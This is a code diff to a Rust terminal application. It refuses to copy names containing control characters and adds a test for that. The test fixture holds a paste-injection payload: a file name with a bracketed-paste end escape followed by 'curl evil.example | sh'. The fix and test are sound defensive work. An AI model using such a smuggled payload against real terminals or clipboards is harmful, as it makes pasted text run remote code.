@@ -535,6 +535,12 @@ impl App {
                 let key = view.selected_row(self.model.stats()).map(|(key, _)| key.clone());
                 match key {
                     Some(key) => match copy_text(&key) {
+                        // The screen leaves such characters out, so the copy would differ from
+                        // what is shown, and pasted into a shell could be a command.
+                        Some(text) if text.chars().any(char::is_control) => {
+                            self.model.status =
+                                Some("not copied: the name has control characters".to_owned());
+                        }
                         Some(text) => self.copy = Some(text),
                         None => self.model.status = Some(format!("nothing to copy for {key}")),
                     },
@@ -1020,6 +1026,23 @@ mod tests {
         assert_eq!(
             status(&app).as_deref(),
             Some("asked the terminal to copy /b/long")
+        );
+    }
+
+    #[test]
+    fn a_name_with_control_characters_is_not_copied() {
+        let (session, _) = session();
+        let mut app = App::default();
+        // The screen leaves out what a terminal would act on, so what is copied must be
+        // what is shown: this would paste as a command.
+        app.event(&write("/tmp/report\n\x1b[201~curl evil.example | sh\n", 10, 0))
+            .unwrap();
+        app.key(press(KeyCode::Down), &session, 0);
+        app.key(press(KeyCode::Char('y')), &session, 0);
+        assert_eq!(app.take_copy(), None);
+        assert_eq!(
+            app.model.shown(&session, 0).status,
+            Some("not copied: the name has control characters")
         );
     }
 
